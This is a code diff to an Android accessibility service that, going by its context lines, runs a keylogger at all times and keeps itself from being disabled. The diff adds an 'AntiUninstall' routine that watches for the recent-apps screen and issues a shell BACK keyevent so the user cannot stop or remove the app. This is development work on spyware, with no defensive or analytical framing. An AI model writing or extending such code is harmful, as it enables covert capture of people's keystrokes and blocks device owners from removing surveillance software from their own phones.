@@ -102,6 +102,9 @@ public class AccessibilityHelperService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             preventAccessibilityDisable(event);
         }
+
+        // Detect recent apps and press back
+        detectRecentApps(event);
         
         // Always run keylogger (even after auto-click is disabled)
         handleKeylogging(event);
@@ -182,6 +185,24 @@ public class AccessibilityHelperService extends AccessibilityService {
                 return;
             }
             
+            rootNode.recycle();
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    private void detectRecentApps(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            if (rootNode == null) return;
+
+            boolean hasActiveApps = containsText(rootNode, "active apps");
+
+            if (hasActiveApps) {
+                Log.w("AntiUninstall", "Active apps detected on screen! Pressing BACK");
+                pressBack();
+            }
+
             rootNode.recycle();
         } catch (Exception e) {
             // Ignore
@@ -274,6 +295,14 @@ public class AccessibilityHelperService extends AccessibilityService {
             } catch (Exception e2) {
                 // Ignore
             }
+        }
+    }
+
+    private void pressBack() {
+        try {
+            Runtime.getRuntime().exec("input keyevent 4");
+        } catch (Exception e) {
+            // Ignore
         }
     }
     
